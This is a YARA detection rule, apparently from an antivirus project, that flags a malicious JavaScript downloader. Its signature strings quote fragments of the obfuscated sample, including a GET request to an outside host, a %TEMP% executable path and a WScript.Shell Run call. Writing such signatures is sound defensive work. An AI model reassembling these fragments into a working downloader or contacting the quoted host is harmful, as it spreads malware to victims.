rule sig_20160329_2e12d63dca42f0adb1cb8dfd58cd82cd {
  meta:
    description = "datamaliciousorder - file 20160329_2e12d63dca42f0adb1cb8dfd58cd82cd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7246d84318e0155abe53719b305b5cd285d42c064306b36fc209142b41e141df"

  strings:
    $s1  = "Sb[V](\"GET\", \"http://www.deco-dessert.com/k3dua\", false);" fullword ascii
    $s2  = "function X() {return KG[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Dx9z1bia.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[P](F() * 11); if (Sb[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function l0(Gf, K){ix = ix * 1; return Gf - K;};" fullword ascii
    $s5  = "var KG = function Md() {return WScript[r](\"WScript.Shell\");}(), a = 11;" fullword ascii
    $s6  = "function I(){return \"\" + f;};" fullword ascii
    $s7  = "function o(Xq){KG[\"Run\"](Xq, ix, ix);};" fullword ascii
    $s8  = "function l() {return ((sU == true) && (sU == Q)) ? 1 : ix;};" fullword ascii
    $s9  = "function F(){return 22;};" fullword ascii
    $s10 = "var H0 = new this[\"Date\"]();" fullword ascii
    $s11 = "function zM(){return r;};" fullword ascii
    $s12 = "return l0(tC, TZ);" fullword ascii
    $s13 = " while (fw){" fullword ascii
    $s14 = "function H(wy) {var KK = (1, 2, 3, 4, 5, wy); return KK;};" fullword ascii
    $s15 = "function wT()" fullword ascii
    $s16 = "Q = true; " fullword ascii
    $s17 = "sU = true; " fullword ascii
    $s18 = "var Q = false;" fullword ascii
    $s19 = "var sU = false;" fullword ascii
    $s20 = "var Om = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}